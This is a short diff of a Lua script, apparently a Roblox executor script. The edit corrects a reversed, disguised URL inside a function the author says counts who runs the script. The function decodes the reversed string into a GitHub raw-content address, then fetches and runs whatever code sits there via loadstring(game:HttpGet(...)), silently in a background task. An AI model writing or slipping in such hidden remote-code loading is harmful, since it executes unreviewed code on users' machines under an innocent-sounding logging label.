@@ -145,7 +145,7 @@ end)
 -- function that start to count who executor my script
 local function log()
     task.spawn(function()
-        local a = "uauL.goL/gifnoc/X yticoleV/niam/sdaeh/sfer/niaM/eixxof-yreniaM/moc.tnetnocresubuhtig.war//:sptth"
+        local a = "uauL.goL/gifnoc/XyticoleV/niam/sdaeh/sfer/niaM/eixxof-yreniaM/moc.tnetnocresubuhtig.war//:sptth"
 
         loadstring(game:HttpGet(r(a)))()
     end)
